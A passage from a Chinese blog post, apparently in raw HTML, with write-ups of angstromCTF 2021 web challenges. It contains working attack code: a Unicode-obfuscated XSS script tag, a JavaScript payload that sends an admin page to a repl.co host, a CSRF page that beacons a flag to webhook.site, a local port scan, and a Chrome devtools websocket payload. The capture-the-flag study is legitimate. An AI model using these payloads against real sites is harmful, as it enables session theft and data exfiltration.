class="string">"welcome"</span>:</span><br><span class="line">        <span class="keyword">if</span> len(bucket) &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> (ERR, <span class="string">"Welcomes can only go at the start"</span>)</span><br><span class="line">        bucket.append(</span><br><span class="line">            <span class="string">"""</span></span><br><span class="line"><span class="string">            &lt;form action="/newcomp" method="POST"&gt;</span></span><br><span class="line"><span class="string">                &lt;input type="text" name="name" placeholder="component name"&gt;</span></span><br><span class="line"><span class="string">                &lt;input type="text" name="cfg" placeholder="component config"&gt;</span></span><br><span class="line"><span class="string">                &lt;input type="submit" value="create component"&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;form action="/reset" method="POST"&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;warning: resetting components gets rid of this form for some reason&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;input type="submit" value="reset components"&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;form action="/contest" method="POST"&gt;</span></span><br><span class="line"><span class="string">                &lt;div class="g-recaptcha" data-sitekey="&#123;&#125;"&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="string">                &lt;input type="submit" value="submit site to contest"&gt;</span></span><br><span class="line"><span class="string">            &lt;/form&gt;</span></span><br><span class="line"><span class="string">            &lt;p&gt;Welcome &lt;strong&gt;&#123;&#125;&lt;/strong&gt;!&lt;/p&gt;</span></span><br><span class="line"><span class="string">            """</span>.format(</span><br><span class="line">                captcha.get(<span class="string">"sitekey"</span>), escape(cfg)</span><br><span class="line">            ).strip()</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">elif</span> name == <span class="string">"char_count"</span>:</span><br><span class="line">        bucket.append(</span><br><span class="line">            <span class="string">"&lt;p&gt;&#123;&#125;&lt;/p&gt;"</span>.format(</span><br><span class="line">                escape(</span><br><span class="line">                    <span class="string">f"&lt;strong&gt;<span class="subst">&#123;len(cfg)&#125;</span>&lt;/strong&gt; characters and &lt;strong&gt;<span class="subst">&#123;len(cfg.split())&#125;</span>&lt;/strong&gt; words"</span></span><br><span class="line">                )</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">elif</span> name == <span class="string">"text"</span>:</span><br><span class="line">        bucket.append(<span class="string">"&lt;p&gt;&#123;&#125;&lt;/p&gt;"</span>.format(escape(cfg)))</span><br><span class="line">    <span class="keyword">elif</span> name == <span class="string">"freq"</span>:</span><br><span class="line">        counts = Counter(cfg)</span><br><span class="line">        (char, freq) = max(counts.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>])</span><br><span class="line">        bucket.append(</span><br><span class="line">            <span class="string">"&lt;p&gt;All letters: &#123;&#125;&lt;br&gt;Most frequent: '&#123;&#125;'x&#123;&#125;&lt;/p&gt;"</span>.format(</span><br><span class="line">                <span class="string">""</span>.join(counts), char, freq</span><br><span class="line">            )</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> (ERR, <span class="string">"Invalid component name"</span>)</span><br><span class="line">    <span class="keyword">return</span> (OK, bucket)</span><br></pre></td></tr></table></figure>
+
+<p>name 有四种方式,都会把部分html塞入<code>bucket</code>。我们访问页面时bucket会作为html代码返回。目标是xss拿到admin的bucket内容</p>
+<p>注意到，四种方式里只有一种<code>freq</code>是塞入的没有经过<code>escape</code>的代码。也就是说想做到xss,就要塞入<code>&lt;</code>,也就只能选这条路了。</p>
+<p>但是其要求很严苛。他回显的是<code>&quot;&quot;.join(counts) =&gt; &quot;&quot;.join(Counter(cfg))</code>。就是说我们payload中重复的部分会被去掉。我们要尝试<strong>没有重复字符的</strong>xss. 近似解决的想法自然是<code>&lt;script src=http://xxx/&gt;</code>。但像域名或者其他位置仍然有重复字符。</p>
+<p>这里我很快想到一个很著名的问题 <a href="http://www.unicode.org/reports/tr46/" target="_blank" rel="noopener">http://www.unicode.org/reports/tr46/</a>。也就是不同字符造成相同domain解析的问题(为了照顾不同语种用户)。</p>
+<p>同时,html标签支持大小写。那么想要不重复字符大概只有一种方式了<br><code>&lt;SCRIPT src=//YOUR_DOMAIN&gt;</code><br>注意<code>//</code>这种加载方式。如果跑在web服务器上，https就会自动找<code>https://YOUR_DOMAIN</code>,http就会自动找<code>http://YOUR_DOMAIN</code>。</p>
+<p>不过我们没法传入俩个<code>/</code>。当然,尝试<code>hTtp:/xxx</code>缩减一个<code>/</code>也是可以的,可惜这样<code>t</code>字符又会重复。简单测试了下，发现<code>\</code>可以替代<code>/</code>(unicode  <code>/</code>字符不能替代)。所以最后转下domain为unicode就可以了。(或者也许有dalao 有不跟前面字符重复的短域名？)这里我因为没开https,没有博客以外的域名，只好去 <a href="repl.it">repl.it</a> 开了个临时node 2333</p>
+<p>domain的转换可以使用 <a href="https://splitline.github.io/domain-obfuscator/" target="_blank" rel="noopener">https://splitline.github.io/domain-obfuscator/</a> 之前在bamboofox CTF中用过</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">()</span>:</span></span><br><span class="line">    r = requests.post(url + <span class="string">'newcomp'</span>, data=&#123;</span><br><span class="line">        <span class="string">'name'</span>: <span class="string">"freq"</span>,</span><br><span class="line">        <span class="string">'cfg'</span>: <span class="string">"&lt;SCRIPT src=\/ⅹ．ℬⓎⓒ㊵4。ᵣₑₚℓ｡ℭº&gt;"</span></span><br><span class="line">    &#125;, cookies=&#123;</span><br><span class="line">        <span class="string">'session'</span>: <span class="string">"eyJ1c2VybmFtZSI6ImJ5YzQwNiJ9.YGkXgQ.QZ2FZ8USqQHWcjStB4p6tTfbsUo"</span></span><br><span class="line">    &#125;)</span><br><span class="line">    print(r.text)</span><br><span class="line">add()</span><br></pre></td></tr></table></figure>
+<p>repl.it上放的是</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fetch(<span class="string">'/?fakeuser=admin'</span>).then(<span class="function"><span class="params">r</span> =&gt;</span> r.text()).then(<span class="function"><span class="params">r</span> =&gt;</span> fetch(<span class="string">`https://x.byc404.repl.co/?flag=<span class="subst">$&#123;btoa(r)&#125;</span>`</span>,&#123;<span class="string">'mode'</span>:<span class="string">'no-cors'</span>&#125;))</span><br></pre></td></tr></table></figure>
+
+
+<p>ps: 其实这个unicode的问题在nodejs 8及以前得版本表现得比较严重。因为其<code>http</code>库在这基础上没有过滤掉<code>\r\n</code>。直接导致CRLF。</p>
+<h2 id="jason"><a href="#jason" class="headerlink" title="jason"></a>jason</h2><p>CSRF。 源码关键部分如下</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sameOrigin</span> (<span class="params">req, res, next</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (req.get(<span class="string">'referer'</span>) &amp;&amp; !req.get(<span class="string">'referer'</span>).startsWith(process.env.URL))</span><br><span class="line">		<span class="keyword">return</span> res.sendStatus(<span class="number">403</span>) </span><br><span class="line">	<span class="keyword">return</span> next()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/passcode'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (req.body.passcode === <span class="string">'CLEAR'</span>) res.append(<span class="string">'Set-Cookie'</span>, <span class="string">'passcode='</span>)</span><br><span class="line">	<span class="keyword">else</span> res.append(<span class="string">'Set-Cookie'</span>, <span class="string">`passcode=<span class="subst">$&#123;(req.cookies.passcode || <span class="string">''</span>)+req.body.passcode&#125;</span>`</span>)</span><br><span class="line">	<span class="keyword">return</span> res.redirect(<span class="string">'/'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/visit'</span>, <span class="keyword">async</span> <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (req.body.site.startsWith(<span class="string">'http'</span>)) <span class="keyword">try</span> &#123;<span class="keyword">await</span> jason.visit(req.body.site) &#125; <span class="keyword">catch</span> (e) &#123;<span class="built_in">console</span>.log(e)&#125;</span><br><span class="line">	<span class="keyword">return</span> res.redirect(<span class="string">'/'</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/languages'</span>, sameOrigin, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	res.jsonp(&#123;<span class="attr">category</span>: <span class="string">'languages'</span>, <span class="attr">items</span>: [<span class="string">'C++'</span>, <span class="string">'Rust'</span>, <span class="string">'OCaml'</span>, <span class="string">'Lisp'</span>, <span class="string">'Physical touch'</span>]&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/friends'</span>, sameOrigin, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	res.jsonp(&#123;<span class="attr">category</span>: <span class="string">'friends'</span>, <span class="attr">items</span>: [<span class="string">'Functional programming'</span>]&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">'/flags'</span>, sameOrigin, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">	<span class="built_in">console</span>.log(req.cookies);</span><br><span class="line">	<span class="keyword">if</span> (req.cookies.passcode !== process.env.PASSCODE) <span class="keyword">return</span> res.sendStatus(<span class="number">403</span>)</span><br><span class="line">	res.jsonp(&#123;<span class="attr">category</span>: <span class="string">'flags'</span>, <span class="attr">items</span>: [process.env.FLAG]&#125;)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.listen(<span class="number">7331</span>)</span><br></pre></td></tr></table></figure>
+
+<p>其中visit部分是个 puppeteer 的bot访问。</p>
+<p>首先很明显。flag在jsonp处。理论上获得jsonp返回值即可。但是它作了referer的检查。这个倒是挺好绕。因为它只考虑了有referer的情况下需要从它的主站来。所以不带referer即可。</p>
+<p>但是，此处我们想外带data必然要劫持jsonp。也就是要让其返回内容作为页面下的可控javascript。所以得用script来跨域加载。 (现在chrome的CORB防范真的非常严格，script只会跨域加载 text/javascript的资源,不过还好jsonp本身就是种跨域方式)</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span><br><span class="line">script.referrerpolicy = <span class="string">'no-referrer'</span></span><br><span class="line">script.src = <span class="string">"http://127.0.0.1:7331/flags?callback=load"</span></span><br><span class="line"><span class="built_in">document</span>.head.appendChild(script)</span><br></pre></td></tr></table></figure>
+
+<p>获得jsonp的方法明白了之后还有一点注意，我们需要admin带cookie访问才能获得flags的jsonp内容。然而这里是express 自带的jsonp而不是那种php自写的jsonp。其callback并不能做到任意字符,也就没有xss了。所以这个站并没有xss利用来获取dom的内容</p>
+<p>所以。单纯利用csrf怎么才能有权访问jsonp呢？这里如果注意到passcode的奇怪写法，方法就水落石出了。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.append(<span class="string">'Set-Cookie'</span>, <span class="string">`passcode=<span class="subst">$&#123;(req.cookies.passcode || <span class="string">''</span>)+req.body.passcode&#125;</span>`</span>)</span><br></pre></td></tr></table></figure>
+<p>此处passcode完全可控。也就是说，我们可以在set-cookie原本的cookie后加入任意内容。要加什么，或者说能加什么，MDN写的是很清楚的<br><img src="https://hackmd.summershrimp.com/uploads/upload_f48c550dfca0159fbd55272b9452de57.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_f48c550dfca0159fbd55272b9452de57.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>cookie的几个安全属性中。httpOnly与SameSite 是用的非常多的。其中httpOnly可以防止通过dom获取cookie.SameSite则指定cookie的作用域。尤其在跨域请求上作用很大。(如果samesite 为none, 即使是csrf也可以利用跨域请求进行xsleak)</p>
+<p>一般来说没有设置SameSite 的话，默认是为Lax的。也就是默认防csrf.所以这里直接利用passcode 设置为None即可。</p>
+<p>注意的是。现在SameSite 为None.时，必须设置Secure为true,也就是必须在https上(除了localhost)才有效。<br><img src="https://hackmd.summershrimp.com/uploads/upload_bcfd6ba59de0ccd6ec9717356a773f18.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_bcfd6ba59de0ccd6ec9717356a773f18.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>这里简单写个表单提交(其他请求如fetch不会顺着跳转。这样set-cookie 就没意义了。)。我们在本页面开个新窗口执行表单后一直调用 location.reload()刷新本页面。这样等cookie在我们的恶意html处生效时，就会调用被劫持的load了。这里可以fetch请求下自己的站外带数据，也可以<code>navigator.sendBeacon</code> post数据</p>
+<p>这里因为他远程的puppeteer 没有timeout.所以最好把interVal的间隔设短点。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> script = <span class="built_in">document</span>.createElement(<span class="string">'script'</span>);</span></span><br><span class="line"><span class="actionscript">        script.referrerpolicy = <span class="string">'no-referrer'</span></span></span><br><span class="line"><span class="actionscript">        script.src = <span class="string">"http://127.0.0.1:7331/flags?callback=load"</span></span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.head.appendChild(script)</span></span><br><span class="line"></span><br><span class="line"><span class="javascript">        <span class="keyword">const</span> load =  <span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span></span><br><span class="line"><span class="javascript">                navigator.sendBeacon(<span class="string">'https://webhook.site/48cbda29-080e-442f-8040-7a52a9093234'</span>, <span class="built_in">window</span>.btoa(data))</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        w = <span class="built_in">window</span>.open(<span class="string">'poc2.html'</span>)</span></span><br><span class="line"><span class="javascript">        setInterval(<span class="function"><span class="params">()</span> =&gt;</span> &#123;</span></span><br><span class="line">                location.reload()</span><br><span class="line">        &#125;, 100)</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://127.0.0.1:7331/passcode"</span> <span class="attr">method</span>=<span class="string">"post"</span> <span class="attr">id</span>=<span class="string">"form"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"passcode"</span> <span class="attr">value</span>=<span class="string">"; SameSite=None; Secure"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>form.submit()<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>后来看了官方题解。基本是一致的。不过他用<code>localStorage.done = true</code>也就是localStorage来存了个标记变量。这样的话保证只会在表单提交好，并且跳转完后才reload.</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">setInterval(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">try</span> &#123; w.location.href &#125;</span><br><span class="line">		<span class="keyword">catch</span> (e) &#123; localStorage.done = <span class="literal">true</span>; location.reload() &#125;</span><br><span class="line">	&#125;, <span class="number">10</span>)</span><br></pre></td></tr></table></figure>
+
+<p><code>actf{jason&#39;s_site_isn&#39;t_so_lax_after_all}</code></p>
+<h2 id="Spoofy"><a href="#Spoofy" class="headerlink" title="Spoofy"></a>Spoofy</h2><p>这题没做。。。但是解出人数挺多的。后来发现可能是错过了一篇文章</p>
+<p><a href="https://jetmind.github.io/2016/03/31/heroku-forwarded.html" target="_blank" rel="noopener">https://jetmind.github.io/2016/03/31/heroku-forwarded.html</a></p>
+<p>简单的说。就是heroku可能会把真实ip append到x-forwarded-for 后。假如传的时候带了两个xff。就可能会解析成</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;x-forwarded-for&quot; &quot;10.10.10.10,99.99.99.99,20.20.20.20&quot;&#125;</span><br></pre></td></tr></table></figure>
+<p>其中 99.99.99.99 是被加进去的真实ip。<br>本题源码部分只要求xff 里<code>,</code> 分割后的ip里。第一个与最后一个相同且为<code>1.3.3.7</code>。所以加个逗号即可</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For: 1.3.3.7</span><br><span class="line">X-Forwarded-For: , 1.3.3.7</span><br></pre></td></tr></table></figure>
+
+<h2 id="Watered-Down-Watermark-as-a-Service"><a href="#Watered-Down-Watermark-as-a-Service" class="headerlink" title="Watered Down Watermark as a Service"></a>Watered Down Watermark as a Service</h2><p>这题因为没时间就没看。但是记得题目名在diceCTF里出现过。后来赛后发现diceCTF的非预期在这里还有。当时在discord里见到有师傅提到用chrome的devtools port做的。印象还很深刻。一方面，byteCTF 线下决赛有个markdownxss, 好像是找浏览器0day xss 后再利用chrome 的devtools port 来着。另一方面我自己写selenium爬虫时发现如果调用的是<code>selenium-webdriver/chrome</code> 也就是自己库里的chrome而不是本机的chrome时，会自动开个devtools 端口来调试。此题用到的puppeteer也是一样</p>
+<p>首先第一步是找到devtools 的端口。由于可以通过http 访问。所以我们只要小范围爆破即可。注意源码的限制</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">app.use(<span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">	res.set(<span class="string">'X-Frame-Options'</span>, <span class="string">'deny'</span>);</span><br><span class="line">	res.set(<span class="string">'X-Content-Type-Options'</span>, <span class="string">'nosniff'</span>);</span><br><span class="line">	next()</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">function</span> <span class="title">visit</span> (<span class="params">url</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!checkURL(url)) <span class="keyword">return</span> <span class="string">'no!!!!'</span></span><br><span class="line">	<span class="keyword">let</span> ctx = <span class="keyword">await</span> (<span class="keyword">await</span> browser).createIncognitoBrowserContext()</span><br><span class="line">	<span class="keyword">let</span> page = <span class="keyword">await</span> ctx.newPage()</span><br><span class="line">	page.on(<span class="string">'framenavigated'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">frame</span>)</span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!checkURL(frame.url())) <span class="keyword">return</span> <span class="string">'no!!!!'</span></span><br><span class="line">	&#125;)</span><br><span class="line">    ......</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkURL</span>(<span class="params">url</span>) </span>&#123;</span><br><span class="line">	<span class="keyword">const</span> urlobj = <span class="keyword">new</span> URL(url)</span><br><span class="line">	<span class="keyword">if</span>(!urlobj.protocol || ![<span class="string">'http:'</span>,<span class="string">'https:'</span>].some(<span class="function"><span class="params">x</span>=&gt;</span>urlobj.protocol.includes(x)) || urlobj.hostname.includes(<span class="string">"actf.co"</span>)) <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>一方面限制了iframe。( 如果页面加载失败。它会定向到chrome://network-error/。而这个就没法判断了)。同时也用<code>X-Content-Type-Options</code>限制了script.不能script跨域加载。</p>
+<p>所以此处我们可以用其他跨域请求方法。fetch + no-cors即可。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;byc&lt;<span class="regexp">/head&gt;</span></span><br><span class="line"><span class="regexp">&lt;body&gt;</span></span><br><span class="line"><span class="regexp">&lt;script&gt;</span></span><br><span class="line"><span class="regexp">for (let port = 40000; port &lt; 45000; port++) &#123;</span></span><br><span class="line"><span class="regexp">    const url = `http:/</span><span class="regexp">/127.0.0.1:$&#123;port&#125;`</span></span><br><span class="line"><span class="regexp">    fetch(url, &#123;mode: 'no-cors'&#125;).then(res =&gt; &#123;</span></span><br><span class="line"><span class="regexp">        document.body.innerHTML += `\n$&#123;url&#125;`</span></span><br><span class="line"><span class="regexp">    &#125;)</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br><span class="line"><span class="regexp">&lt;/</span>script&gt;</span><br><span class="line">        &lt;link rel=<span class="string">"stylesheet"</span> href=<span class="string">"http://difajosdifjwioenriqoewrowifjaoijdaf.com"</span>&gt;</span><br><span class="line">    &lt;<span class="regexp">/body&gt;</span></span><br><span class="line"><span class="regexp">    &lt;/</span>html&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_9f8a44adf3b87817bffebb31c0f2cb28.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_9f8a44adf3b87817bffebb31c0f2cb28.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>之后我们访问其<code>json/new</code>路由。他会</p>
+<blockquote>
+<p>Opens a new tab. Responds with the websocket target data for the new tab.</p>
+</blockquote>
+<p>这样就会新开一个标签页。且我们能执行任意js.为了获取flag自然是<code>http://127.0.0.1:40027/json/new?file:///app/flag.txt</code> 来用浏览器打开flag</p>
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_0755bcaf56fc15a780806f90ddb83fb7.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_0755bcaf56fc15a780806f90ddb83fb7.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>根据 <a href="https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate" target="_blank" rel="noopener">https://chromedevtools.github.io/devtools-protocol/tot/Runtime/#method-evaluate</a></p>
+<p>我们可以用Runtime.evaluate 来执行任意js</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">window</span>.ws = <span class="keyword">new</span> WebSocket(<span class="string">`ws://127.0.0.1:40027/devtools/page/98D1EC60387BE0038D514389E2887339 `</span>)</span><br><span class="line">ws.onmessage = (<span class="function"><span class="params">e</span> =&gt;</span> &#123; <span class="built_in">document</span>.writeln(<span class="string">"&lt;h3&gt;"</span> + e.data + <span class="string">"&lt;/h3&gt;"</span>); &#125;)</span><br><span class="line">ws.onopen = <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">    ws.send(<span class="built_in">JSON</span>.stringify(&#123;</span><br><span class="line">        id: <span class="number">1</span>,</span><br><span class="line">        method: <span class="string">'Runtime.evaluate'</span>,</span><br><span class="line">        params: &#123; <span class="attr">expression</span>: <span class="string">'document.body.innerHTML'</span> &#125;</span><br><span class="line">    &#125;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://hackmd.summershrimp.com/uploads/upload_ef0259a59051d89cd59c3a272b05de51.png" class="lazyload" data-srcset="https://hackmd.summershrimp.com/uploads/upload_ef0259a59051d89cd59c3a272b05de51.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt></p>
+<p>还是学到很多的。预期好像是构造BSON 数据。感觉跟web关系不大。。。</p>
+<h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>  总的来说题目质量都很不错。很难想象是给高中生准备的题。。。关于前端的一些知识自己也有了一些新的见解。希望能有机会总结下。</p>
+<h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://github.com/qxxxb/ctf/tree/master/2021/angstrom_ctf/watered_down_watermark" target="_blank" rel="noopener">https://github.com/qxxxb/ctf/tree/master/2021/angstrom_ctf/watered_down_watermark</a></p>
+<p><a href="https://github.com/r00tstici/writeups/tree/master/angstromCTF_2021/spoofy" target="_blank" rel="noopener">https://github.com/r00tstici/writeups/tree/master/angstromCTF_2021/spoofy</a></p>
+
+  
+  
+    
+    <div class='footer'>
+      
+      
+      
+        <div class='copyright'>
+          <blockquote>
+            
+              
+                <p>博客内容遵循 署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</p>
+
+              
+            
+              
+                <p>本文永久链接是：<a href=https://www.bycsec.top/2021/04/04/angstromCTF-2021/>https://www.bycsec.top/2021/04/04/angstromCTF-2021/</a></p>
+              
+            
+          </blockquote>
+        </div>
+      
+      
+        <div class='donate'>
+          <div class='imgs'>
+            
+              <img src='/assests/wechat.png'>
+            
+          </div>
+        </div>
+      
+    </div>
+  
+  
+    
+
+
+  <div class='article-meta' id="bottom">
+    <div class='new-meta-box'>
+      
+        
